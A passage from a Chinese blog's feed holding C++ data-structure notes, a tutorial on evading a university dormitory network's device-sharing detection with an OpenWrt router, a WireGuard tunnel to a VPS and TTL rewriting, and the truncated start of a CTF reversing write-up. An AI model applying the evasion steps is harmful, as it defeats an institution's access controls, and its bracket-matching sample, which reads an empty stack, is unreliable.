class="title">DisplayLinkedList</span><span class="params">(Node* L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (L == L-&gt;next)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[Blank LinkedList]\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        Node* head = L-&gt;next;</span><br><span class="line">        <span class="keyword">for</span> (Node* p = head-&gt;next; p != head; p = p-&gt;next)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, p-&gt;data);</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Node* l = <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="built_in">InitLinkedList</span>(l);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l, <span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l, <span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l, <span class="number">5</span>, <span class="number">5</span>);</span><br><span class="line">    <span class="built_in">DisplayLinkedList</span>(l);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">0 1 2 3 4 5</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<h3 id="循环单链表合并尾指针表示-带头节点">循环单链表合并(尾指针表示,
带头节点)</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ElemType int</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span></span><br><span class="line">&#123;</span><br><span class="line">    ElemType data;</span><br><span class="line">    Node* next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">InitLinkedList</span><span class="params">(Node*&amp; L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    L = (Node*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(Node));</span><br><span class="line">    <span class="keyword">if</span> (!L)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    L-&gt;next = L;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">InsertLinkedList</span><span class="params">(Node*&amp; L, <span class="type">int</span> index, ElemType data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (index &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    Node* head = L-&gt;next;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i = <span class="number">-1</span>;</span><br><span class="line">    Node* p = head;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == index - <span class="number">1</span>)     <span class="comment">//如果当前节点为要插入位置的前一个节点</span></span><br><span class="line">        &#123;</span><br><span class="line">            Node* newNode = (Node*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(Node));</span><br><span class="line">            <span class="keyword">if</span> (!newNode)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            newNode-&gt;data = data;</span><br><span class="line">            newNode-&gt;next = p-&gt;next;</span><br><span class="line">            p-&gt;next = newNode;</span><br><span class="line">            <span class="keyword">if</span> (newNode-&gt;next == head)  <span class="comment">//如果新插入的节点是尾节点, 那么把尾指针指向新节点</span></span><br><span class="line">                L = newNode;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        p = p-&gt;next, i++;</span><br><span class="line">    &#125; <span class="keyword">while</span> (p != head);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;  <span class="comment">// 如果整个循环链表中都没有目标位置, 就返回错误代码-1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MergeLinkedList</span><span class="params">(Node*&amp; La, Node*&amp; Lb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//将b循环链表接到a循环链表的后面</span></span><br><span class="line">    Node* aHead = La-&gt;next;</span><br><span class="line">    Node* bHead = Lb-&gt;next;</span><br><span class="line"></span><br><span class="line">    La-&gt;next = bHead-&gt;next;</span><br><span class="line">    Lb-&gt;next = aHead;</span><br><span class="line">    <span class="built_in">free</span>(bHead);    <span class="comment">//释放b循环链表的头节点</span></span><br><span class="line">    La = Lb;</span><br><span class="line">    Lb = <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DisplayLinkedList</span><span class="params">(Node* L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (L == L-&gt;next)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[Blank LinkedList]\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        Node* head = L-&gt;next;</span><br><span class="line">        <span class="keyword">for</span> (Node* p = head-&gt;next; p != head; p = p-&gt;next)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, p-&gt;data);</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Node* l1 = <span class="literal">nullptr</span>, *l2=<span class="literal">nullptr</span>;</span><br><span class="line">    <span class="built_in">InitLinkedList</span>(l1);</span><br><span class="line">    <span class="built_in">InitLinkedList</span>(l2);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l1, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l1, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l1, <span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l1, <span class="number">3</span>, <span class="number">3</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l1, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l2, <span class="number">0</span>, <span class="number">5</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l2, <span class="number">1</span>, <span class="number">6</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l2, <span class="number">2</span>, <span class="number">7</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l2, <span class="number">3</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l2, <span class="number">4</span>, <span class="number">9</span>);</span><br><span class="line">    <span class="built_in">DisplayLinkedList</span>(l1);</span><br><span class="line">    <span class="built_in">DisplayLinkedList</span>(l2);</span><br><span class="line">    <span class="built_in">MergeLinkedList</span>(l1, l2);</span><br><span class="line">    <span class="built_in">DisplayLinkedList</span>(l1);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">0 1 2 3 4</span></span><br><span class="line"><span class="comment">5 6 7 8 9</span></span><br><span class="line"><span class="comment">0 1 2 3 4 5 6 7 8 9</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<h3 id="栈的应用-括号匹配">栈的应用-括号匹配</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">match</span><span class="params">(<span class="type">char</span> <span class="type">const</span>* str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::stack&lt;<span class="type">char</span>&gt; s;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; str[i]; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (str[i] == <span class="string">&#x27;(&#x27;</span> || str[i] == <span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">            s.<span class="built_in">push</span>(str[i]);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (str[i] == <span class="string">&#x27;)&#x27;</span> &amp;&amp; s.<span class="built_in">top</span>() == <span class="string">&#x27;(&#x27;</span>)</span><br><span class="line">            s.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (str[i] == <span class="string">&#x27;]&#x27;</span> &amp;&amp; s.<span class="built_in">top</span>() == <span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">            s.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::cout.<span class="built_in">setf</span>(std::ios::boolalpha);</span><br><span class="line">    std::cout &lt;&lt; <span class="built_in">match</span>(<span class="string">&quot;[[()[()]]]&quot;</span>) &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="built_in">match</span>(<span class="string">&quot;[[()[()]])&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">true</span></span><br><span class="line"><span class="comment">false</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<h3 id="栈的应用-进制转换">栈的应用-进制转换</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//无符号数的进制转换</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">BaseConvert</span><span class="params">(<span class="type">unsigned</span> base, <span class="type">unsigned</span> num, <span class="type">char</span>* str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::stack&lt;<span class="type">char</span>&gt; s;</span><br><span class="line">    <span class="keyword">for</span> (; num; num /= base)</span><br><span class="line">        s.<span class="built_in">push</span>(num % base + <span class="number">0x30</span>);	<span class="comment">//取余并转换为ASCII码</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;!s.<span class="built_in">empty</span>();s.<span class="built_in">pop</span>(), i++)</span><br><span class="line">        str[i] = s.<span class="built_in">top</span>();</span><br><span class="line">    str[i] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> s[<span class="number">32</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">unsigned</span> num = <span class="number">0x12345678</span>;</span><br><span class="line">    <span class="built_in">BaseConvert</span>(<span class="number">2</span>, num, s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;2进制: %s\n&quot;</span>, s);</span><br><span class="line">    <span class="built_in">BaseConvert</span>(<span class="number">8</span>, num, s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;8进制: %s\n&quot;</span>, s);</span><br><span class="line">    <span class="built_in">BaseConvert</span>(<span class="number">10</span>, num, s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;10进制: %s\n&quot;</span>, s);</span><br><span class="line">    <span class="built_in">BaseConvert</span>(<span class="number">16</span>, num, s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;16进制: %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">2进制: 10010001101000101011001111000</span></span><br><span class="line"><span class="comment">8进制: 2215053170</span></span><br><span class="line"><span class="comment">10进制: 305419896</span></span><br><span class="line"><span class="comment">16进制: 12345678</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>绕过某大学宿舍设备共享检测</title>
    <url>/2024/10/23/%5BNote%5D%E7%BB%95%E8%BF%87%E6%9F%90%E5%A4%A7%E5%AD%A6%E5%AE%BF%E8%88%8D%E8%AE%BE%E5%A4%87%E5%85%B1%E4%BA%AB%E6%A3%80%E6%B5%8B/</url>
    <content><![CDATA[<h2 id="基本原理">基本原理</h2>
<p>利用加密隧道传输可能暴露设备特征的非加密流量
(<code>NTP</code>/<code>HTTP</code>/<code>DNS</code>等) ,
直连<code>443</code>端口让<code>HTTPS</code>流量直接流向公网减少服务器带宽消耗,
并降低网页浏览延时.
另外将<code>wan</code>口出去的流量全部统一<code>TTL</code>,
从而实现<code>wan</code>口不包含任何非加密流量且不包含<code>TTL</code>特征.</p>
<blockquote>
<p>为什么不伪装<code>UA</code>和<code>IPID</code>?</p>
<p><code>HTTP</code>流量走加密隧道出去了无需伪装;
实测<code>IPID</code>不在检测范围内, 也不需要.</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202410232005840.png" alt="image-20241023200522750" style="zoom:80%;" /></p>
<h2 id="准备工作">准备工作</h2>
<ul>
<li><p>一台可以刷<code>OpenWrt</code>的路由器, 最好是官方支持的, 比如
<code>Redmi-AC2100</code>/<code>Redmi-AX6S</code>.</p></li>
<li><p>一台落地<code>VPS</code>, 地域最好是湖北,
用于和路由器建<code>WireGuard</code>加密隧道,
转发除<code>HTTPS</code>以外的流量.
因为流量大部分都来自于<code>HTTPS</code>, 所以这个机器带宽要求不高,
不下<code>BT</code>这种基本没啥问题,
如果你恰好财力雄厚可以考虑大带宽服务器.</p></li>
</ul>
<blockquote>
<p>我用的<a href="https://yiandrive.com/">亿安云</a>, 几块钱一个月,
跑满百兆没问题, NAT机配一下端口映射又不是不能用(</p>
</blockquote>
<p>本教程基于最新版<code>OpenWrt-23.05.5</code>编写,
使用<code>Nfatbles</code>完成防火墙配置,
旧版使用<code>iptabes</code>不能直接套用.</p>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202410232113782.png" alt="image-20241023211354698" style="zoom:45%;" /></p>
<h2 id="配置流程">配置流程</h2>
<h3 id="配置转发服务器">配置转发服务器</h3>
<p>以<code>Ubuntu</code>为例, <code>SSH</code>连接上去之后,
编辑<code>/etc/sysctl.conf</code>, 打开路由转发并重启.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net.ipv4.ip_forward=1</span><br></pre></td></tr></table></figure>
<p>安装<code>Wireguard</code>, 网络问题先换源.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt upgrade</span><br><span class="line">apt install wireguard</span><br></pre></td></tr></table></figure>
<p>配置<code>WireGuard</code>, 准备<code>wg0.conf</code>.</p>
<p>私钥用<code>wg genkey</code>生成, 用<code>wg pubkey</code>读出公钥,
总共需要两对, 路由器一对, <code>VPS</code>一对.</p>
<blockquote>
<p>文件名决定了<code>WireGuard</code>网络接口的名字, 不要改,
另外<code>ens18</code>需要改为<code>VPS</code>的出口网卡名.</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Interface</span><br><span class="line">PrivateKey = [VPS端的私钥]</span><br><span class="line">Address = 10.0.0.1/24</span><br><span class="line">PostUp   = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -A FORWARD -o wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o ens18 -j MASQUERADE</span><br><span class="line">PostDown = iptables -D FORWARD -i wg0 -j ACCEPT; iptables -D FORWARD -o wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o ens18 -j MASQUERADE</span><br><span class="line">ListenPort = 25053</span><br><span class="line">MTU = 1280</span><br><span class="line"></span><br><span class="line">[Peer]</span><br><span class="line">PublicKey = [路由器端的公钥]</span><br><span class="line">AllowedIPs = 10.0.0.0/24</span><br></pre></td></tr></table></figure>
<p>准备好之后执行<code>wg-quick up ./wg0.conf</code>启动网络接口,
正常状态类似下图.</p>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202410231936017.png" alt="image-20241023193625966" style="zoom: 50%;" /></p>
<blockquote>
<p>某些机器可能需要安装一些依赖, 我这台缺失<code>openresolv</code>,
使用<code>apt install openresolv</code>安装即可.</p>
<p>然后再<code>wg-quick down ./wg0.conf &amp;&amp; wg-quick up ./wg0.conf</code>重启接口.</p>
</blockquote>
<p>通过<code>wg show</code>可以查看接口状态(图中因为接口已经连接,
略有不同), 如果没有显示任何内容说明没生效.</p>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202410231929479.png" alt="image-20241023192926429" style="zoom: 80%;" /></p>
<h3 id="配置路由器环境">配置路由器环境</h3>
<p>建议使用官方版<code>OpenWrt</code>, 方便进行固件定制,
在重置路由器后可以不用从头安装软件包,
<code>OpenWrt</code>提供了快捷的固件定制网页.</p>
<blockquote>
<p><code>ImmortalWrt</code>也可以, 这里以<code>OpenWrt</code>为例.</p>
<p><a href="https://firmware-selector.openwrt.org/">下载适用于您设备的
OpenWrt 固件</a></p>
</blockquote>
<p>需要添加的软件包,
分别是<code>luci</code>汉化包,<code>iproute2</code>和<code>wireguard</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">luci-i18n-base-zh-cn</span><br><span class="line">luci-i18n-firewall-zh-cn</span><br><span class="line">luci-i18n-opkg-zh-cn</span><br><span class="line">ip-full</span><br><span class="line">luci-proto-wireguard</span><br></pre></td></tr></table></figure>
<p>修改首次运行脚本, 如图, 在末尾插入, 实现自动换源.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sed -i &#x27;s/downloads.openwrt.org/mirrors.ustc.edu.cn\/openwrt/g&#x27; /etc/opkg/distfeeds.conf</span><br></pre></td></tr></table></figure>
<p>也可以修改一下<code>lan_ip_address="192.168.31.1"</code>,
避免默认<code>192.168.1.1</code>的<code>lan</code>地址和其他设备冲突.</p>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202410231952313.png" alt="image-20241023195206214" style="zoom: 40%;" /></p>
<p>然后把固件刷入设备即可, 重置路由器也不用重新安装了.
不采用定制固件方式也可以自己去<code>OpenWrt</code>后台自己装, 就是麻烦,
效果一样.</p>
<h3 id="配置nftables">配置nftables</h3>
<p><code>SSH</code>连接到路由器,
在<code>/etc/nftables.d/</code>下新建<code>user_mangle.nft</code>文件,
原有文件可以不动, 也可以把以下内容粘贴到原有文件之后, 效果一样.</p>
<p>第一个链将从<code>lan</code>口来的目的端口为<code>443</code>的流量打上<code>0x233</code>标记,
第二个链将所有从<code>wan</code>口流出的流量的<code>TTL</code>统一为<code>64</code>(理论上还需要修改<code>IPv6</code>的<code>TTL</code>,
但是他们没提供<code>IPv6</code>网络, 就先不管了).</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chain user_mangle_mark443 &#123;</span><br><span class="line">    type filter hook prerouting priority mangle; policy accept;</span><br><span class="line">    iifname br-lan tcp dport 443 meta mark set 0x233 counter;</span><br><span class="line">    iifname br-lan udp dport 443 meta mark set 0x233 counter;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">chain user_mangle_ttl64 &#123;</span><br><span class="line">    type filter hook postrouting priority mangle; policy accept;</span><br><span class="line">    oifname wan ip ttl set 64 counter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>配置完成后输入<code>service firewall restart</code>重启<code>nfatbles</code>服务.</p>
<blockquote>
<p>报语法错误说明编辑时使用了中文回车(CRLF)而不是Unix回车(LF)</p>
</blockquote>
<h3 id="wireguard连接前准备">WireGuard连接前准备</h3>
<p>先认证让路由器通网,
再去<code>lan</code>口和<code>wan</code>口的高级设置中把<strong>使用默认网关</strong>取消勾选,
避免自动添加路由带来的干扰.</p>
<p>配置完路由表应只剩<code>lan</code>口和<code>wan</code>口的子网路由,
没有<code>0.0.0.0/0</code>默认路由, 此时路由器处于断网状态.</p>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202410232103600.png" alt="image-20241023210350526" style="zoom:50%;" /></p>
<p>配置<code>wan</code>口<code>DNS</code>服务器为公网<code>IP</code>服务器,
比如<code>114</code>,
因为后续路由器的<code>DNS</code>流量也全部走加密隧道,
内网<code>DNS</code>服务器不可用.</p>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202410232111372.png" alt="image-20241023211113288" style="zoom: 50%;" /></p>
<p>在静态路由的<code>main</code>表中中添加一条<code>wan</code>路由,
目标是<code>VPS</code>的<code>IP</code>,
让连接<code>VPS</code>的流量走<code>wan</code>口出去.</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202410232120365.png"
alt="image-20241023212054307" />
<figcaption aria-hidden="true">image-20241023212054307</figcaption>
</figure>
<p>在防火墙新建一个<code>vpn</code>区域,
等下要把<code>WireGuard</code>的接口添加进这个区域.</p>
<p><code>lan</code>区域需要开启<code>mss钳制</code>,
<strong>非常重要</strong>,
不开启可能会因为<code>mtu</code>问题会导致电脑无法联网.</p>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202410232126886.png" alt="image-20241023212600795" style="zoom: 50%;" /></p>
<p>允许<code>lan</code>侧流量转发至<code>vpn</code>,
允许<code>vpn</code>侧流量转发至<code>wan</code>侧,
并开启<code>vpn</code>的<code>IP</code>动态伪装, 设置完效果如图.</p>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202410232123866.png" alt="image-20241023212309762" style="zoom:50%;" /></p>
<p>编辑防火墙-通信规则, 新增一条<code>Allow-Direct</code>规则,
允许打上<code>0x233</code>标记的流量从<code>lan</code>区域转发到<code>wan</code>区域.</p>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202410232133291.png" alt="image-20241023213346203" style="zoom: 50%;" /></p>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202410232134735.png" alt="image-20241023213350568" style="zoom: 50%;" /></p>
<h3 id="添加wireguard接口">添加WireGuard接口</h3>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202410232140630.png" alt="image-20241023214001566" style="zoom:50%;" /></p>
<p>填入路由器端的公私钥, 设置<code>IP</code>. 勾选无主机路由,
那一步在静态路由里配过了, 自动有时候会出问题.</p>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202410232140976.png" alt="image-20241023214035874" style="zoom:50%;" /></p>
<p>设置<code>MTU</code>为<code>1280</code>, 与<code>VPS</code>保持一致,
取消勾选使用默认网关.</p>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202410232145462.png" alt="image-20241023214542384" style="zoom:50%;" /></p>
<p>防火墙设置为之前新建的<code>vpn</code>区域</p>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202410232147588.png" alt="image-20241023214748515" style="zoom:50%;" /></p>
<p>填入<code>VPS</code>的公钥,
设置允许<code>IP</code>为<code>0.0.0.0/0</code>,
端点<code>IP</code>为<code>VPS</code>的<code>IP</code>,
端口填<code>VPS</code>的监听端口.</p>
<blockquote>
<p>如果是公网<code>IP</code>的<code>VPS</code>,
那么这个端口应该与<code>wg0.conf</code>里的监听端口一致为<code>25053</code></p>
<p>我这里用的是<code>NAT</code>主机, 端口号为自己映射的外网端口</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202410232144564.png" alt="image-20241023214439453" style="zoom:50%;" /></p>
<p>设置完成后可以在 状态-<code>Wireguard</code> 里查看连接情况,
如果上次握手时间正常的话说明连接成功.</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202410232154437.png"
alt="image-20241023215420360" />
<figcaption aria-hidden="true">image-20241023215420360</figcaption>
</figure>
<h3 id="配置路由">配置路由</h3>
<p>编辑<code>/etc/iproute2/rt_tables</code>,
添加一张新的路由表<code>direct</code>, 序号为<code>50</code>,
用于路由直连流量.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#添加完类似这样</span><br><span class="line"># reserved values</span><br><span class="line">#</span><br><span class="line">128     prelocal</span><br><span class="line">255     local</span><br><span class="line">254     main</span><br><span class="line">253     default</span><br><span class="line">50      direct</span><br><span class="line">0       unspec</span><br><span class="line">#</span><br><span class="line"># local</span><br><span class="line">#</span><br><span class="line">#1      inr.ruhep</span><br></pre></td></tr></table></figure>
<p>添加两条新的路由</p>
<ol type="1">
<li><p><code>main</code>表的<code>0.0.0.0/0</code>默认路由,
用于转发本机所有流量至<code>vpn</code>,
通过<code>vpn</code>接口发往<code>10.0.0.1</code>网关,
这个路由添加完成后路由器和下面的设备就可以联网了,
此时所有流量均通过<code>VPS</code>转发.</p></li>
<li><p><code>direct</code>表的<code>0.0.0.0/0</code>默认路由,
用于将直连流量通过<code>wan</code>口发出,
此时<code>direct</code>表不起作用, 还需要添加路由规则,
让带有<code>0x233</code>标记的流量去查询这张路由表.</p></li>
</ol>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202410232200295.png"
alt="image-20241023220050209" />
<figcaption aria-hidden="true">image-20241023220050209</figcaption>
</figure>
<p>添加<code>IPv4</code>路由规则, 设置优先级为<code>50</code>,
表为<code>direct</code>,
在高级设置里匹配防火墙标志<code>0x233</code>.</p>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202410232209796.png" alt="image-20241023220907699" style="zoom: 50%;" /></p>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202410232210597.png" alt="image-20241023221035510" style="zoom:50%;" /></p>
<p>此时所有配置已完成, <code>443</code>端口也直连外网了.</p>
<p>附上路由表/规则/<code>Nfatbles</code>/接口配置参照.</p>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202410232213367.png" alt="image-20241023221308269" style="zoom:50%;" /></p>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202410232305071.png" alt="image-20241023230514961" style="zoom:50%;" /></p>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202410232214641.png" alt="image-20241023221448546" style="zoom:50%;" /></p>
<h2 id="后记">后记</h2>
<p>这个方案理论上还有可以改进的地方, 不过我没有再去尝试了,
喜欢折腾的可以试试.</p>
<ul>
<li>把服务器的<code>IPv6</code>地址分配到本机使用</li>
<li>开放除<code>443</code>外的其它端口</li>
</ul>
]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>OpenWrt</tag>
        <tag>WireGuard</tag>
        <tag>校园网</tag>
        <tag>nftables</tag>
      </tags>
  </entry>
  <entry>
    <title>[2019红帽杯]easyRE</title>
    <url>/2022/01/28/%5BReverse%5D2019%E7%BA%A2%E5%B8%BD%E6%9D%AF-easyRE/</url>
    <content><![CDATA[<p><code>Linux</code>可执行文件, 直接拖进<code>IDA</code>, F5查看伪代码,
但是有些复杂抓不住关键, 打开<code>String</code>窗口改由字符串入手.</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/image-20220128151231261.png"
alt="image-20220128151231261" />
<figcaption aria-hidden="true">image-20220128151231261</figcaption>
</figure>
<p>跟到字符串所在位置, 交叉引用确定程序语句再F5看伪代码,
直接找到关键点</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/image-20220128151403433.png"
alt="image-20220128151403433" />
<figcaption aria-hidden="true">image-20220128151403433</figcaption>
</figure>
<p>分析程序</p>
